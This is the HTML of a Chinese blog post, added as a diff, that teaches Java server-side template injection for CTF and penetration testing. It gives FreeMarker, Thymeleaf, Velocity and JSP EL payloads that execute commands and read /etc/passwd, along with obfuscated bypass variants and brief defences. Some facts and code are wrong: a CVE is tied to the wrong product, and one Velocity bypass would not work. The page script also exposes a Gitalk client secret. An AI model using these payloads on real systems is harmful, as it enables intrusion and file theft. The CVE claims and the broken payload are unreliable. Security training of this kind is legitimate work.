@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SSTI-Java模板注入全面指南 | isum</title>
+  <meta name="keywords" content=" ssti ">
+  <meta name="description" content="SSTI-Java模板注入全面指南 | isum">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="关于页">
+<meta property="og:url" content="https://ehzisum.github.io/about/index.html">
+<meta property="og:site_name" content="isum">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-26T23:27:22.000Z">
+<meta property="article:modified_time" content="2024-11-29T07:11:30.823Z">
+<meta property="article:author" content="isum">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avater.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avater.jpg"/>
+</a>
+<div class="author">
+    <span>isum</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(5)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="ctf">
+            
+            ctf
+            <small>(4)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="other">
+            
+            other
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  site_url"
+               
+               href="/about">关于</a>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="5">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://kaikaix.github.io/">kaikaix</a></li>
+            
+            <li><a target="_blank" href="https://nicolee278.github.io/">nicolee278</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hexo</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2025/03/24/SSTI-php%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ESmarty%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI-php模板引擎Smarty注入全面指南">SSTI-php模板引擎Smarty注入全面指南</span>
+            <span class="post-date" title="2025-03-24 09:12:27">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2025/03/24/SSTI-Java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI-Java模板注入全面指南">SSTI-Java模板注入全面指南</span>
+            <span class="post-date" title="2025-03-24 09:03:16">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2025/03/24/SSTI-python%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8EJinja2%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI-python模板引擎Jinja2注入全面指南">SSTI-python模板引擎Jinja2注入全面指南</span>
+            <span class="post-date" title="2025-03-24 09:02:31">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2025/03/24/SSTI-php%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ETwig%E6%B3%A8%E5%85%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI-php模板引擎Twig注入全面指南">SSTI-php模板引擎Twig注入全面指南</span>
+            <span class="post-date" title="2025-03-24 09:01:02">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 other "
+           href="/2024/04/26/hello-world/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2024-04-26 11:03:00">2024/04/26</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-SSTI-Java模板注入全面指南" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SSTI-Java模板注入全面指南</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="ctf">ctf</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">ssti</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2025-03-24 09:03:36'>2025-03-24 09:03</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Java%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-text">1. Java常见模板引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BE%8B"><span class="toc-text">2. 开发中的代码实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%EF%BC%88FreeMarker%EF%BC%89"><span class="toc-text">漏洞代码示例（FreeMarker）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%EF%BC%88Thymeleaf%EF%BC%89"><span class="toc-text">漏洞代码示例（Thymeleaf）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-text">二、渗透关键点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1. 检测注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%95%E6%93%8E%E8%AF%86%E5%88%AB"><span class="toc-text">2. 引擎识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8EPayload"><span class="toc-text">三、漏洞利用与Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-FreeMarker%E6%B3%A8%E5%85%A5"><span class="toc-text">1. FreeMarker注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E9%9C%80new%E6%8C%87%E4%BB%A4%E6%9C%AA%E7%A6%81%E7%94%A8%EF%BC%89"><span class="toc-text">命令执行（需new指令未禁用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Thymeleaf%E6%B3%A8%E5%85%A5"><span class="toc-text">2. Thymeleaf注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%AB%98%E5%8D%B1%EF%BC%89"><span class="toc-text">预处理表达式（高危）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80%EF%BC%88EL%EF%BC%89%E5%88%A9%E7%94%A8"><span class="toc-text">表达式语言（EL）利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Velocity%E6%B3%A8%E5%85%A5"><span class="toc-text">3. Velocity注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-1"><span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-JSP%EF%BC%88JSTL%EF%BC%89EL%E6%B3%A8%E5%85%A5"><span class="toc-text">4. JSP（JSTL）EL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E6%97%A7%E7%89%88EL%EF%BC%89"><span class="toc-text">命令执行（旧版EL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-2"><span class="toc-text">文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="toc-text">四、防御手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E7%94%A8%E9%98%B2%E5%BE%A1"><span class="toc-text">1. 通用防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">2. 安全配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">五、绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%96%E7%A0%81%E6%B7%B7%E6%B7%86"><span class="toc-text">1. 编码混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-text">2. 字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%8D%E5%B0%84%E9%93%BE%E8%B0%83%E7%94%A8"><span class="toc-text">3. 反射链调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%82%E8%80%83"><span class="toc-text">六、总结与参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-text">1. 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%AB%98%E5%8D%B1CVE"><span class="toc-text">2. 高危CVE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="toc-text">3. 参考资源</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-Java常见模板引擎"><a href="#1-Java常见模板引擎" class="headerlink" title="1. Java常见模板引擎"></a>1. Java常见模板引擎</h3><p>• <strong>FreeMarker</strong>：广泛用于企业级应用，语法为<code>$&#123;expression&#125;</code>。<br>• <strong>Thymeleaf</strong>：Spring生态主流模板引擎，语法为<code>[[$&#123;expression&#125;]]</code>。<br>• <strong>Velocity</strong>：Apache项目，语法为<code>$variable</code>和<code>#directive</code>。<br>• **JSP (JSTL)**：传统Java模板，支持表达式语言（EL）如<code>$&#123;expression&#125;</code>。</p>
+<hr>
+<h3 id="2-开发中的代码实例"><a href="#2-开发中的代码实例" class="headerlink" title="2. 开发中的代码实例"></a>2. 开发中的代码实例</h3><h4 id="漏洞代码示例（FreeMarker）"><a href="#漏洞代码示例（FreeMarker）" class="headerlink" title="漏洞代码示例（FreeMarker）"></a>漏洞代码示例（FreeMarker）</h4><pre><code class="java">// 危险操作：直接渲染用户输入
+String userInput = request.getParameter(&quot;content&quot;);
+Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
+Template template = new Template(&quot;injected&quot;, new StringReader(userInput), cfg);
+StringWriter output = new StringWriter();
+template.process(null, output); // 导致SSTI
+</code></pre>
+<h4 id="漏洞代码示例（Thymeleaf）"><a href="#漏洞代码示例（Thymeleaf）" class="headerlink" title="漏洞代码示例（Thymeleaf）"></a>漏洞代码示例（Thymeleaf）</h4><pre><code class="java">// 危险操作：用户输入作为模板片段
+String input = request.getParameter(&quot;param&quot;);
+Context context = new Context();
+context.setVariable(&quot;param&quot;, input);
+String result = templateEngine.process(input, context); // 直接渲染用户输入
+</code></pre>
+<hr>
+<h2 id="二、渗透关键点"><a href="#二、渗透关键点" class="headerlink" title="二、渗透关键点"></a>二、渗透关键点</h2><h3 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h3><p>• <strong>输入点</strong>：URL参数、模板动态拼接内容。<br>• <strong>检测方法</strong>：</p>
+<pre><code class="http">GET /page?param=$&#123;7 * 7&#125; HTTP/1.1          &lt;!-- FreeMarker/Velocity/JSP EL --&gt;
+GET /page?param=[[$&#123;7 * 7&#125;]] HTTP/1.1     &lt;!-- Thymeleaf --&gt;
+</code></pre>
+<p>  观察响应中是否返回<code>49</code>。</p>
+<h3 id="2-引擎识别"><a href="#2-引擎识别" class="headerlink" title="2. 引擎识别"></a>2. 引擎识别</h3><p>• <strong>FreeMarker</strong>：报错信息包含<code>FreeMarker template error</code>。<br>• <strong>Thymeleaf</strong>：报错信息包含<code>Thymeleaf</code>或<code>TemplateProcessingException</code>。<br>• <strong>Velocity</strong>：报错信息包含<code>Velocity</code>或<code>ParseException</code>。</p>
+<hr>
+<h2 id="三、漏洞利用与Payload"><a href="#三、漏洞利用与Payload" class="headerlink" title="三、漏洞利用与Payload"></a>三、漏洞利用与Payload</h2><h3 id="1-FreeMarker注入"><a href="#1-FreeMarker注入" class="headerlink" title="1. FreeMarker注入"></a>1. FreeMarker注入</h3><h4 id="命令执行（需new指令未禁用）"><a href="#命令执行（需new指令未禁用）" class="headerlink" title="命令执行（需new指令未禁用）"></a>命令执行（需<code>new</code>指令未禁用）</h4><pre><code class="freemarker">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;
+$&#123; ex(&quot;id&quot;) &#125;
+</code></pre>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><pre><code class="freemarker">&lt;#assign file = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.File&quot;,&quot;/etc/passwd&quot;)&gt;
+&lt;#assign is = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.FileInputStream&quot;, file)&gt;
+&lt;#assign br = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.BufferedReader&quot;, &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.InputStreamReader&quot;, is))&gt;
+&lt;#list 1..1000 as _&gt;
+$&#123; br.readLine()! &#125;
+&lt;/#list&gt;
+</code></pre>
+<hr>
+<h3 id="2-Thymeleaf注入"><a href="#2-Thymeleaf注入" class="headerlink" title="2. Thymeleaf注入"></a>2. Thymeleaf注入</h3><h4 id="预处理表达式（高危）"><a href="#预处理表达式（高危）" class="headerlink" title="预处理表达式（高危）"></a>预处理表达式（高危）</h4><pre><code class="java">// 用户输入为：__$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;__::.x
+[[$&#123;param&#125;]]  // 渲染时触发命令执行
+</code></pre>
+<h4 id="表达式语言（EL）利用"><a href="#表达式语言（EL）利用" class="headerlink" title="表达式语言（EL）利用"></a>表达式语言（EL）利用</h4><pre><code class="thymeleaf">$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125; &lt;!-- 需要启用表达式预处理 --&gt;
+</code></pre>
+<hr>
+<h3 id="3-Velocity注入"><a href="#3-Velocity注入" class="headerlink" title="3. Velocity注入"></a>3. Velocity注入</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><pre><code class="velocity">#set($exec = $util.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null))
+$exec.exec(&quot;id&quot;)
+</code></pre>
+<h4 id="文件读取-1"><a href="#文件读取-1" class="headerlink" title="文件读取"></a>文件读取</h4><pre><code class="velocity">#set($reader = $util.getClass().forName(&quot;java.io.FileReader&quot;).newInstance(&quot;/etc/passwd&quot;))
+#set($buf = $util.getClass().forName(&quot;java.io.BufferedReader&quot;).newInstance($reader))
+#foreach($i in [1..1000])
+$buf.readLine()
+#end
+</code></pre>
+<hr>
+<h3 id="4-JSP（JSTL）EL注入"><a href="#4-JSP（JSTL）EL注入" class="headerlink" title="4. JSP（JSTL）EL注入"></a>4. JSP（JSTL）EL注入</h3><h4 id="命令执行（旧版EL）"><a href="#命令执行（旧版EL）" class="headerlink" title="命令执行（旧版EL）"></a>命令执行（旧版EL）</h4><pre><code class="jsp">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;id&quot;))&#125;
+</code></pre>
+<h4 id="文件读取-2"><a href="#文件读取-2" class="headerlink" title="文件读取"></a>文件读取</h4><pre><code class="jsp">$&#123;&#39;&#39;.getClass().forName(&#39;java.io.BufferedReader&#39;).newInstance(&#39;&#39;.getClass().forName(&#39;java.io.FileReader&#39;).newInstance(&#39;/etc/passwd&#39;)).readLine()&#125;
+</code></pre>
+<hr>
+<h2 id="四、防御手段"><a href="#四、防御手段" class="headerlink" title="四、防御手段"></a>四、防御手段</h2><h3 id="1-通用防御"><a href="#1-通用防御" class="headerlink" title="1. 通用防御"></a>1. 通用防御</h3><p>• <strong>输入过滤</strong>：禁止用户输入直接嵌入模板逻辑。<br>• <strong>沙盒模式</strong>：<br>  • <strong>FreeMarker</strong>：配置<code>new_builtin_class_resolver</code>限制类访问。<br>  • <strong>Velocity</strong>：启用<code>SecureUberspector</code>限制反射。<br>  • <strong>Thymeleaf</strong>：禁用预处理表达式（<code>spring.thymeleaf.mode=HTML</code>）。</p>
+<h3 id="2-安全配置"><a href="#2-安全配置" class="headerlink" title="2. 安全配置"></a>2. 安全配置</h3><p>• <strong>FreeMarker</strong>：</p>
+<pre><code class="java">cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
+</code></pre>
+<p>• <strong>Thymeleaf</strong>：避免使用<code>@&#123;&#125;</code>动态拼接模板路径。<br>• <strong>JSP</strong>：禁用EL表达式（<code>&lt;%@ page isELIgnored=&quot;true&quot; %&gt;</code>）。</p>
+<hr>
+<h2 id="五、绕过技巧"><a href="#五、绕过技巧" class="headerlink" title="五、绕过技巧"></a>五、绕过技巧</h2><h3 id="1-编码混淆"><a href="#1-编码混淆" class="headerlink" title="1. 编码混淆"></a>1. 编码混淆</h3><pre><code class="jsp">$&#123;&#39;&#39;[&#39;cl&#39;+&#39;ass&#39;].forName(&#39;java.la&#39;+&#39;ng.Run&#39;+&#39;time&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Run&#39;+&#39;time&#39;).getMethod(&#39;getRun&#39;+&#39;time&#39;).invoke(null),&#39;id&#39;)&#125;
+</code></pre>
+<h3 id="2-字符串拼接"><a href="#2-字符串拼接" class="headerlink" title="2. 字符串拼接"></a>2. 字符串拼接</h3><pre><code class="velocity">#set($cmd = &quot;j&quot;)
+#set($cmd = $cmd + &quot;ava.lang.Run&quot;)
+$cmd.getRuntime().exec(&quot;id&quot;)
+</code></pre>
+<h3 id="3-反射链调用"><a href="#3-反射链调用" class="headerlink" title="3. 反射链调用"></a>3. 反射链调用</h3><pre><code class="freemarker">&lt;#assign rt = &quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.lang.Runtime&quot;)&gt;
+&lt;#assign method = rt?api.class.getMethod(&quot;getRuntime&quot;)&gt;
+$&#123;method.invoke(null)?api.exec(&quot;id&quot;)&#125;
+</code></pre>
+<hr>
+<h2 id="六、总结与参考"><a href="#六、总结与参考" class="headerlink" title="六、总结与参考"></a>六、总结与参考</h2><h3 id="1-测试流程"><a href="#1-测试流程" class="headerlink" title="1. 测试流程"></a>1. 测试流程</h3><ol>
+<li>检测注入点 → 2. 识别引擎类型 → 3. 构造反射链 → 4. 执行命令&#x2F;读取文件</li>
+</ol>
+<h3 id="2-高危CVE"><a href="#2-高危CVE" class="headerlink" title="2. 高危CVE"></a>2. 高危CVE</h3><p>• <strong>CVE-2021-21346</strong>：Thymeleaf预处理表达式注入（影响版本&lt;3.0.12）。<br>• <strong>CVE-2020-13952</strong>：Apache Velocity远程代码执行（影响版本&lt;2.2）。</p>
+<h3 id="3-参考资源"><a href="#3-参考资源" class="headerlink" title="3. 参考资源"></a>3. 参考资源</h3><p>• <a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/pgui_config_security.html">FreeMarker安全指南</a><br>• <a target="_blank" rel="noopener" href="https://blog.codecentric.de/en/2021/03/thymeleaf-ssti/">Thymeleaf预处理漏洞分析</a><br>• <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Expression_Language_Injection">JSP EL注入研究</a></p>
+<hr>
+<p><strong>备注</strong>：Java模板注入通常需要构造反射链或利用特定引擎的指令，渗透测试时需结合目标引擎版本调整Payload。重点关注<code>Runtime.getRuntime().exec()</code>和文件读写操作。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: '3730732a738faf14fdef',
+            clientSecret: '4b7d5f3ee2f01c82c5a658dab63ca47202db57d9',
+            repo: 'issues',
+            owner: 'ehzisum',
+            admin: ['ehzisum'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    落雨，开花，起风，挂霜
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 18px 3px 15px 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
